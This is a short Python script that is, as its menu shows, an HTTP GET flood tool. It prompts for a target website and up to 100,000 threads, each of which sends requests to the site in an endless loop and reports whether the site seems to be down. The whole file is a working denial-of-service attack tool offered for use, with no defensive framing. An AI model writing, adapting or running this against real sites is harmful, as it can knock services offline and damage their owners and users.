import requests as reqs
import threading as thread
import time

def httpGet(web, tnum):
	packNo=1
	while 1:
		try:
			reqs.get(web)
			print(f"[THREAD-{tnum}]Packet No {packNo} sent to {web} succesfully!")
			packNo += 1
		except:
			print(f"[!] THREAD-{tnum} Fail to send GET Packet, site down?")
			time.sleep(3)




def httpGetDialog():
	web = input("Website : ")
	
	if not "http" in web:
		web = f"http://{web}"
		
	thr = input("Thread(s) (default 10) (1-100000) : ")
	
	if thr == " " or thr == "":
		thr = 10
		
	if int(thr) <= 0 or int(thr) > 100000:
		print("too many or less thread!")
		exit()
		
	tnum = 1
	while tnum <= int(thr):
		t = thread.Thread(target=httpGet, args=(web, tnum))
		t.start()
		print(f"[+] Thread {tnum} deployed.")
		tnum += 1
	
	
class main:
	print("Select Mode :")
	print("1. Http GET")
	p = input("~> ")
	if p == "1":
		httpGetDialog()